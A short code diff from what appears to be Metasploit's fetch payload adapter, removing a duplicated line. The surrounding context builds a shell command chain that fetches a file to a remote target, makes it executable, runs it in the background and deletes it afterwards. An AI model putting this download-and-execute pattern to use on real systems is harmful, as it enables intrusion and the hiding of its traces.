@@ -351,8 +351,6 @@ module Msf::Payload::Adapter::Fetch
       cmds = get_file_cmd
     end
 
-    cmds = get_file_cmd
-
     cmds << ";chmod +x #{_remote_destination_nix}"
     cmds << ";#{_remote_destination_nix}&"
     cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
